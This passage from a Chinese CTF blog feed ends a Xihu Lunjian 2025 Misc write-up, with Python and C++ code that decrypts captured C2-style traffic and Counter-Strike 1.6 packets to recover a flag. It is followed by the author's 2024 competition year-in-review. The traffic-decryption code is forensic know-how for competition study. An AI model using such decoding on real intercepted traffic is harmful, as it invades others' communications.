key:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(aes_key.<span class="built_in">hex</span>()))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;HMAC key:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(hmac_key.<span class="built_in">hex</span>()))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Ciphertext:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(plaintext.<span class="built_in">hex</span>())</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128153609278.png" alt="image-20250128153609278"></p><p>在流1382处传了一个流量包，提取出来</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128165615257.png" alt="image-20250128165615257"></p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128165755667.png" alt="image-20250128165755667"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import hmac</span><br><span class="line">import binascii</span><br><span class="line">import base64</span><br><span class="line">import hexdump</span><br><span class="line">from Crypto.Cipher import AES</span><br><span class="line">AES_KEY = binascii.unhexlify(&quot;9fe14473479a283821241e2af78017e8&quot;)</span><br><span class="line">HMAC_KEY = binascii.unhexlify(&quot;1e3d54f1b9f0e106773a59b7c379a89d&quot;)</span><br><span class="line">encrypt_data = &quot;hex&quot; #把上面图中的Data部分复制过来</span><br><span class="line">def decrypt(encrypted_data, iv_bytes, signature, AES_KEY, hmac_key):</span><br><span class="line">    cipher = AES.new(AES_KEY, AES.MODE_CBC, iv_bytes)</span><br><span class="line">    return cipher.decrypt(encrypted_data)</span><br><span class="line">encrypt_data = bytes.fromhex(encrypt_data)</span><br><span class="line">try:</span><br><span class="line">    encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder=&#x27;big&#x27;, signed=False)</span><br><span class="line">    encrypt_data_l = encrypt_data[4:]</span><br><span class="line">    data1 = encrypt_data_l[:encrypt_data_length-16]</span><br><span class="line">    signature = encrypt_data_l[encrypt_data_length-16:encrypt_data_length]</span><br><span class="line">    iv_bytes = b&quot;abcdefghijklmnop&quot;</span><br><span class="line">    dec = decrypt(data1, iv_bytes, signature, AES_KEY, HMAC_KEY)</span><br><span class="line">except:</span><br><span class="line">    dec = decrypt(encrypt_data, iv_bytes, signature, AES_KEY, HMAC_KEY)</span><br><span class="line">print(&quot;counter: &#123;&#125;&quot;.format(int.from_bytes(dec[:4], byteorder=&#x27;big&#x27;, signed=False)))</span><br><span class="line">print(&quot;任务返回长度: &#123;&#125;&quot;.format(int.from_bytes(dec[4:8], byteorder=&#x27;big&#x27;, signed=False)))</span><br><span class="line">print(&quot;任务输出类型: &#123;&#125;&quot;.format(int.from_bytes(dec[8:12], byteorder=&#x27;big&#x27;, signed=False)))</span><br><span class="line">print(hexdump.hexdump(dec[:1000]))</span><br><span class="line">open(&#x27;secret.pcapng&#x27;,&#x27;wb&#x27;).write(dec[64:-76])</span><br></pre></td></tr></table></figure><p>打开流量包，发现里面全都是27015端口在通讯，查询可知这是游戏cs1.6的流量包</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128165953359.png" alt="image-20250128165953359"></p><p>接下来根据<a href="https://www.anquanke.com/post/id/261339">这篇文章</a>来解密</p><p>将下面这个cpp文件编译成so文件</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> _LongSwap(<span class="type">int</span> l)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">int</span> res = __builtin_bswap32(*(<span class="type">unsigned</span> <span class="type">int</span> *)&amp;l);</span><br><span class="line">        <span class="keyword">return</span> *(<span class="type">int</span> *)&amp;(res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> mungify_table[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x7A</span>, <span class="number">0x64</span>, <span class="number">0x05</span>, <span class="number">0xF1</span>,</span><br><span class="line">            <span class="number">0x1B</span>, <span class="number">0x9B</span>, <span class="number">0xA0</span>, <span class="number">0xB5</span>,</span><br><span class="line">            <span class="number">0xCA</span>, <span class="number">0xED</span>, <span class="number">0x61</span>, <span class="number">0x0D</span>,</span><br><span class="line">            <span class="number">0x4A</span>, <span class="number">0xDF</span>, <span class="number">0x8E</span>, <span class="number">0xC7</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> mungify_table2[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x05</span>, <span class="number">0x61</span>, <span class="number">0x7A</span>, <span class="number">0xED</span>,</span><br><span class="line">            <span class="number">0x1B</span>, <span class="number">0xCA</span>, <span class="number">0x0D</span>, <span class="number">0x9B</span>,</span><br><span class="line">            <span class="number">0x4A</span>, <span class="number">0xF1</span>, <span class="number">0x64</span>, <span class="number">0xC7</span>,</span><br><span class="line">            <span class="number">0xB5</span>, <span class="number">0x8E</span>, <span class="number">0xDF</span>, <span class="number">0xA0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mungify_table3[] =</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="number">0x20</span>, <span class="number">0x07</span>, <span class="number">0x13</span>, <span class="number">0x61</span>,</span><br><span class="line">            <span class="number">0x03</span>, <span class="number">0x45</span>, <span class="number">0x17</span>, <span class="number">0x72</span>,</span><br><span class="line">            <span class="number">0x0A</span>, <span class="number">0x2D</span>, <span class="number">0x48</span>, <span class="number">0x0C</span>,</span><br><span class="line">            <span class="number">0x4A</span>, <span class="number">0x12</span>, <span class="number">0xA9</span>, <span class="number">0xB5</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">COM_UnMunge2</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> *data, <span class="type">int</span> len, <span class="type">int</span> seq)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">int</span> mungelen;</span><br><span class="line">        <span class="type">int</span> c;</span><br><span class="line">        <span class="type">int</span> *pc;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">char</span> *p;</span><br><span class="line">        <span class="type">int</span> j;</span><br><span class="line"></span><br><span class="line">        mungelen = len &amp; ~<span class="number">3</span>;</span><br><span class="line">        mungelen /= <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; mungelen; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            pc = (<span class="type">int</span> *)&amp;data[i * <span class="number">4</span>];</span><br><span class="line">            c = *pc;</span><br><span class="line">            c ^= seq;</span><br><span class="line"></span><br><span class="line">            p = (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;c;</span><br><span class="line">            <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)</span><br><span class="line">            &#123;</span><br><span class="line">                *p++ ^= (<span class="number">0xa5</span> | (j &lt;&lt; j) | j | mungify_table2[(i + j) &amp; <span class="number">0x0f</span>]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            c = _LongSwap(c);</span><br><span class="line">            c ^= ~seq;</span><br><span class="line">            *pc = c;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g++ -fPIC -shared -o dll.so 1.cpp</span><br></pre></td></tr></table></figure><p>然后用下面的程序加载编译出的dll.so解密流量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> scapy.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line">lib=CDLL(<span class="string">&#x27;./dll.so&#x27;</span>)</span><br><span class="line">COM_UnMunge=lib.COM_UnMunge2</span><br><span class="line"></span><br><span class="line">pcaps = rdpcap(<span class="string">&quot;secret.pcapng&quot;</span>)</span><br><span class="line"></span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;res&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> mpacket <span class="keyword">in</span> pcaps.<span class="built_in">filter</span>(<span class="keyword">lambda</span> x:UDP <span class="keyword">in</span> x <span class="keyword">and</span> x[UDP].sport==<span class="number">27015</span>):</span><br><span class="line">    <span class="comment"># mpacket.show()</span></span><br><span class="line">    udp=mpacket[UDP]</span><br><span class="line">    data=<span class="built_in">bytes</span>(udp.payload)[<span class="number">8</span>:]</span><br><span class="line">    seq=<span class="built_in">bytes</span>(udp.payload)[:<span class="number">4</span>]</span><br><span class="line">    ack=<span class="built_in">bytes</span>(udp.payload)[<span class="number">4</span>:<span class="number">8</span>]</span><br><span class="line">    c=create_string_buffer(data)</span><br><span class="line">    COM_UnMunge(c,<span class="built_in">len</span>(data),seq[<span class="number">0</span>])</span><br><span class="line">    <span class="built_in">print</span>(mpacket.time,mpacket[IP].src,<span class="string">&#x27;-&gt;&#x27;</span>,mpacket[IP].dst)</span><br><span class="line">    decode_bytes=<span class="built_in">bytes</span>(c)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(decode_bytes)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">if</span> struct.unpack(<span class="string">&#x27;&lt;L&#x27;</span>, seq)[<span class="number">0</span>] &amp; (<span class="number">1</span>&lt;&lt;<span class="number">30</span>):</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(decode_bytes)&gt;<span class="number">10</span>+struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, decode_bytes[<span class="number">7</span>:<span class="number">9</span>])[<span class="number">0</span>]+<span class="number">1</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;find extra data block:&#x27;</span>)</span><br><span class="line">                <span class="built_in">print</span>(decode_bytes[<span class="number">10</span>+struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, decode_bytes[<span class="number">7</span>:<span class="number">9</span>])[<span class="number">0</span>]:])</span><br><span class="line">            decode_bytes=decode_bytes[<span class="number">10</span>:<span class="number">10</span>+struct.unpack(<span class="string">&#x27;&lt;h&#x27;</span>, decode_bytes[<span class="number">7</span>:<span class="number">9</span>])[<span class="number">0</span>]]</span><br><span class="line">        f.write(decode_bytes)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;finally decode data:<span class="subst">&#123;decode_bytes&#125;</span>\nlength:<span class="subst">&#123;<span class="built_in">len</span>(decode_bytes)&#125;</span>&#x27;</span>)        </span><br><span class="line">f.close</span><br></pre></td></tr></table></figure><p>在得到的res文件中搜索不难找到flag</p><p><img src="/images/%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%912025-Misc-Writeup-%E5%A4%8D%E7%8E%B0/image-20250128172100493.png" alt="image-20250128172100493"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 西湖论剑 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024年度总结</title>
      <link href="/posts/c2cf88b8/"/>
      <url>/posts/c2cf88b8/</url>
      
        <content type="html"><![CDATA[<h2 id="导语"><a href="#导语" class="headerlink" title="导语"></a>导语</h2><p>打CTF也有一年了，写个年度报告吧。</p><p>总的来说，这是忙忙碌碌而又颗粒无收的一年，大比赛的奖是一个都没拿到<del>（菜的一批）</del>o(╥﹏╥)o</p><p>不过通过这些比赛也是学到了很多东西，毕竟我也可以算是在网安方面刚刚起步，知识就是这样一点点累积起来的 :)</p><p>再者就是在今年我加入了校队和星盟安全团队，认识了很多大佬，也在联队的培训和茶话会中见识到了很多于我而言的新的东西，了解到了很多前所未闻的技术。从这一点来看，我今年还是win了的 :)</p><p>下面就按月份列一下我一年的历程吧。</p><h2 id="1月"><a href="#1月" class="headerlink" title="1月"></a>1月</h2><p>这时我才刚起步CTF不久，只打过学校的0xGame和NCTF，基本上还在靶场刷题阶段。</p><p>搭建起了我的博客<a href="https://www.blog.st4rr.top/">https://www.blog.st4rr.top/</a></p><h2 id="2月"><a href="#2月" class="headerlink" title="2月"></a>2月</h2><h3 id="BeginCTF"><a href="#BeginCTF" class="headerlink" title="BeginCTF"></a>BeginCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/02/06/BeginCTF2024-Writeup/">点我</a></p><p>这个比赛好像是我自己一个人打着练手的，是个新生赛来着，拿了个第11名。这个比赛没有奖品，唯一记得的是这是我第一次见到tupper自指公式。</p><img src="/images/2024年度总结/IMG_5408.JPG" alt="IMG_5408" style="zoom:50%;" /><h3 id="HGame"><a href="#HGame" class="headerlink" title="HGame"></a>HGame</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/02/06/HGame2024-Writeup/">点我</a></p><p>一年一度的杭电新生赛，也是南邮校科协寒假大作战安全组指定比赛。记得当时我Misc打得还不错，基本ak了，现在想来这也可能影响到了我后来选择misc方向，成为了一名 <del>musc</del> misc手。</p><h3 id="SICTF"><a href="#SICTF" class="headerlink" title="SICTF"></a>SICTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/02/19/SICTF2024-Writeup/">点我</a></p><p>找了个朋友f4k3r一起打的，拿了第45名，拿到了我CTF史中的第一个奖品，一台服务器1个月的使用权。</p><p>这个比赛也是我第一次接触区块链的题目，区块链的题目在网上的wp非常的少，而当时区块链的那些名词对我来说也是完全新的事物，所以当时即使是在学长zysgmzb的超级耐心的指导下我也仍然没做出来:( </p><p>当然赛后我专门写了一篇博客好好做了复现：<a href="https://www.blog.st4rr.top/2024/02/22/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E4%B8%8A%E9%93%BE/">点我</a></p><p>这个时候我绝对不会想到就在八个月后的0xGame中我成了区块链的出题人</p><img src="/images/2024年度总结/IMG_5409.JPG" alt="IMG_5409" style="zoom:50%;" /><h2 id="3月"><a href="#3月" class="headerlink" title="3月"></a>3月</h2><h3 id="qsnCTF"><a href="#qsnCTF" class="headerlink" title="qsnCTF"></a>qsnCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/03/01/qsnCTF2024%20Round1-Writeup/">点我</a></p><p>仍然是跟f4k3r一起打的，由于只有两个人发力，只拿了个优胜奖。加入战队的需要显得越发迫切。</p><img src="/images/2024年度总结/image-20250122113232477.png" alt="image-20250122113232477" style="zoom:50%;" /><h3 id="HSCCTF"><a href="#HSCCTF" class="headerlink" title="HSCCTF"></a>HSCCTF</h3><p>这个比赛打的人很少，给我混了个第十三名。</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/IMG_5410.JPG" alt="IMG_5410"></p><h3 id="NKCTF"><a href="#NKCTF" class="headerlink" title="NKCTF"></a>NKCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/03/24/NKCTF2024-Writeup/">点我</a></p><p>记得在这场比赛中被打爆了，但是这应该是我打的第一场misc里有MC题的比赛</p><h2 id="4月"><a href="#4月" class="headerlink" title="4月"></a>4月</h2><h3 id="加入X1cT34m"><a href="#加入X1cT34m" class="headerlink" title="加入X1cT34m"></a>加入X1cT34m</h3><p>校队的misc招新，两道题，四个flag，边做边学，最终也是全做出来了，遂成功加入校队。</p><p>刚刚接触网安的时候就听说了小绿草的名声，我甚至可以说是就是为此来南邮学的信安，如今终于成功加入了。前辈们确实全都很强，都是各自方向的顶尖人才，往年也是把各大比赛的国一拿了个遍Orz Orz Orz</p><p>但是到我们这届没落了( 我们这届无pwn，web手由于还打算法所以经常会没空，密码手在十一月才加入战斗，一个re和两个misc<del>，这玩毛线</del></p><p>希望下一届能Make X1cT34m Great Again吧 :(</p><h3 id="XYCTF"><a href="#XYCTF" class="headerlink" title="XYCTF"></a>XYCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/04/29/2024-04-29-XYCTF2024-Writeup/">点我</a></p><p>也是和f4k3r一起打的，记得好像由于持续时间太长，到后面摆了()</p><h2 id="5月"><a href="#5月" class="headerlink" title="5月"></a>5月</h2><h3 id="CISCN初赛"><a href="#CISCN初赛" class="headerlink" title="CISCN初赛"></a>CISCN初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/05/19/CISCN2024-Writeup/">点我</a></p><p>当时我们届已经加入校队的四个(wuming, 1n1t, w8nn9z, St4rr)一起组了个X2cT34m打的，学长们是X1cT34m。我们队由于没有crypto，我在打misc的同时还顺带负责看了一眼crypto。学长们毫无悬念的晋级了，我们是压线晋级的。</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20250122135739611.png" alt="image-20250122135739611"></p><h3 id="京麒CTF初赛"><a href="#京麒CTF初赛" class="headerlink" title="京麒CTF初赛"></a>京麒CTF初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/05/26/jqctf2024%E5%88%9D%E8%B5%9B-Misc/">点我</a></p><p>这次真就纯靠学长们发力了，直接给干到了第一名Orz 我贡献了一个misc</p><img src="/images/2024年度总结/IMG_5411(20250122-140341).PNG" alt="IMG_5411(20250122-140341)" style="zoom: 25%;" /><h2 id="6月"><a href="#6月" class="headerlink" title="6月"></a>6月</h2><h3 id="LitCTF"><a href="#LitCTF" class="headerlink" title="LitCTF"></a>LitCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/06/01/LitCTF2024-Writeup/">点我</a></p><p>一个人打的，打爽了，但没有奖品</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/7d5495c151445252fb4f98e7e9c55bfc_720.png" alt="img"></p><h3 id="CISCN华东北赛区赛"><a href="#CISCN华东北赛区赛" class="headerlink" title="CISCN华东北赛区赛"></a>CISCN华东北赛区赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/05/19/CISCN2024-Writeup/">点我</a></p><p>第一次打线下赛，还是awdp模式。由于我们队都是菜狗，面对题目一脸懵逼，所以只拿了个三等奖，然后遗憾退场。学长们一如既往地强，他们的队伍进了决赛，然后最终拿到了国一Orz</p><p>后来听学长说，赛区赛他做的系统其实有问题，可以直接通过patch传个马上去然后再攻击就行了。好吧其实我在比赛时也想到了这个方法，跟我们队的web手说了这个想法后他尝试了一下告诉我没成功，然后我也就没去试，想着主办方应该不会犯这么低级的错误。。。所以也就没去试。。。:(</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/21797C860C0B27C72092B0E2E891CBD6.png" alt="21797C860C0B27C72092B0E2E891CBD6"></p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/4B6473F4627BEF60D6943B46E51C06ED.png" alt="4B6473F4627BEF60D6943B46E51C06ED"></p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/8FFCC683F28A481BE7BE693351986628.png"></p><h2 id="7月"><a href="#7月" class="headerlink" title="7月"></a>7月</h2><p>一直只是在练习CTF，没打比赛</p><h2 id="8月"><a href="#8月" class="headerlink" title="8月"></a>8月</h2><h3 id="加入星盟预备队Hyperion"><a href="#加入星盟预备队Hyperion" class="headerlink" title="加入星盟预备队Hyperion"></a>加入星盟预备队Hyperion</h3><p>由于我们这届校队的配置要打比赛实在是绠短汲深，因此我决定去加入联队。星盟看起来挺强的，各大比赛也算是榜上有名，另外根据其招新标准我掂量着自己应该能达到，于是我试着向星盟投了简历。</p><p>misc方向当时总共给了两道招新题，我在一天内就都做出来了，也顺利通过了面试，遂成功进入了星盟的预备队。</p><img src="/images/2024年度总结/DEF5B71D48D6FAE5FAB1B0CF9193604D.png" alt="DEF5B71D48D6FAE5FAB1B0CF9193604D" style="zoom: 25%;" /><h3 id="京麒CTF决赛"><a href="#京麒CTF决赛" class="headerlink" title="京麒CTF决赛"></a>京麒CTF决赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/08/jqctf2024%E5%86%B3%E8%B5%9B-Misc-kerberoasting%E5%A4%8D%E7%8E%B0/">点我</a></p><p>和几位学长一起去北京京东总部参加了京麒CTF的决赛。</p><p>misc一共两题，ai的那个学长做出来了，另一个kerberoasting的流量分析我对着看了一天愣是没做出来，遂成功爆零o(╥﹏╥)o</p><p>这道题总共是有三个小问，要求提交的是三个小问的答案拼在一起的结果。结果赛后复现时我发现，原来我一开始的答案就有两个小问是对的，然而由于我不知道到底有几个小问错，所以一直在那不停地改，然后越改越离谱。。。</p><p>最终排名过低，只拿了个优胜奖 :(</p><p>不过也是有机会见识到了京东总部，这一趟来的还是挺值的</p><img src="/images/2024年度总结/IMG_3622.JPG" alt="IMG_3622"  /><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/IMG_3630.JPG" alt="IMG_3630"></p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/2A38D14BF8619B1DE00BA5FDD42E1077.png" alt="2A38D14BF8619B1DE00BA5FDD42E1077"></p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/IMG_3634.JPG" alt="IMG_3634"></p><img src="/images/2024年度总结/36279bb0462f43e45d0cb63c90079c54.JPG" alt="36279bb0462f43e45d0cb63c90079c54" style="zoom: 25%;" /><h3 id="MoeCTF"><a href="#MoeCTF" class="headerlink" title="MoeCTF"></a>MoeCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/16/MoeCTF2024-Writeup/">点我</a></p><p>一个新生赛，就看了第一周，题挺不错的</p><h3 id="巅峰极客初赛"><a href="#巅峰极客初赛" class="headerlink" title="巅峰极客初赛"></a>巅峰极客初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024%E5%88%9D%E8%B5%9B-Misc-%E7%AE%80%E5%8E%86%E5%A4%8D%E7%8E%B0/">点我</a></p><p>跟校队打的，抽象比赛，一开赛发现全是web，其他方向都只有一题，然而我们的web手缺席。。。未晋级</p><p>唯一的一道misc，都已经做到最后一步了，结果卡住了。。。这是我第一次做到病毒分析题，也是学到了。</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22024.jpeg" alt="img"></p><h3 id="NepCTF"><a href="#NepCTF" class="headerlink" title="NepCTF"></a>NepCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/26/NepCTF2024-Writeup/">点我</a></p><p>nepnep办的个人赛，不会别的所以只做了misc，第一次学到了区块链的重入攻击。</p><p>最终拿了个方向优胜奖。</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/image-20250122181252381.png" alt="image-20250122181252381"></p><h3 id="羊城杯初赛"><a href="#羊城杯初赛" class="headerlink" title="羊城杯初赛"></a>羊城杯初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/08/28/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/">点我</a></p><p>跟校队打的，记得misc有很多脑洞题，根本想不到<del>（好吧就是我太菜了）</del>。显然未晋级</p><h2 id="9月"><a href="#9月" class="headerlink" title="9月"></a>9月</h2><h3 id="长城杯初赛"><a href="#长城杯初赛" class="headerlink" title="长城杯初赛"></a>长城杯初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/09/08/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/">点我</a></p><p>跟校队打的，两个misc手+一个re手组队。。。不用说了</p><p>记得这个比赛的misc挺简单的，很轻松就ak了。其他方向想做但是一点不懂。。。是时候该学点其他方向了</p><h3 id="ByteCTF初赛"><a href="#ByteCTF初赛" class="headerlink" title="ByteCTF初赛"></a>ByteCTF初赛</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/09/22/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/">点我</a></p><p>这次比赛有学长参加，所以成功晋级了()</p><p>但是我misc又爆零了。。。但是通过复现又学到了不少东西</p><p><img src="/images/2024%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/130E289D33E160CB0F1D095AB2928855.png" alt="130E289D33E160CB0F1D095AB2928855"></p><h3 id="WMCTF"><a href="#WMCTF" class="headerlink" title="WMCTF"></a>WMCTF</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/09/24/WMCTF2024-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/">点我</a></p><p>从这开始比赛基本都是跟星盟预备队打的了</p><p>但是这个比赛我又爆零了。。。光是zysgmzb学长出的两道题就够顶了Orz 好好复现了一下，知识++</p><p>未得奖:(</p><h3 id="SCTF"><a href="#SCTF" class="headerlink" title="SCTF"></a>SCTF</h3><p>跟星盟预备队打的，贡献了一道misc :)</p><p>还有一个misc看了半天没做出来，好好复现了一下。</p><p>这个比赛中还有两个crypto，我都是做了一半没做出来，幸亏队里的密码手给力做出来了<del>，我终于不用在打misc的时候再去顾着其他方向了</del>:)</p><p>赛后复现发现原来是我不会二元coppersmith:(</p><h2 id="10月"><a href="#10月" class="headerlink" title="10月"></a>10月</h2><h3 id="御宛杯"><a href="#御宛杯" class="headerlink" title="御宛杯"></a>御宛杯</h3><p>wp: <a href="https://www.blog.st4rr.top/2024/10/15/%E5%BE%A1%E5%AE%9B%E6%9D%AF2024-Writeup/">点我</a></p><p>一个个人赛，打爽了，至少取证做爽了()</p><p>拿了个二等奖<del>（这奖状一定是来搞笑的）</del></p><img src="/images/2024年度总结/季博杯.png" alt="季博杯" style="zoom:50%;" /><h3 id="办赛0xGame"><a href="#办赛0xGame" class="headerlink" title="办赛0xGame"></a>办赛0xGame</h3><p>misc官方wp: <a href="https://www.blog.st4rr.top/2024/11/11/0xGame2024-Misc-Official-Writeup/">点我</a></p><p>去年还在坐牢，今年也是当起出题人了()</p><p>今年0xGame2024的misc方向（包括osint, blockchain, forensics）是我和w8nn9z一起出的，出题好难，比做题还难:(</p><p>第一次出题，出的不好还请师傅们多多包涵() 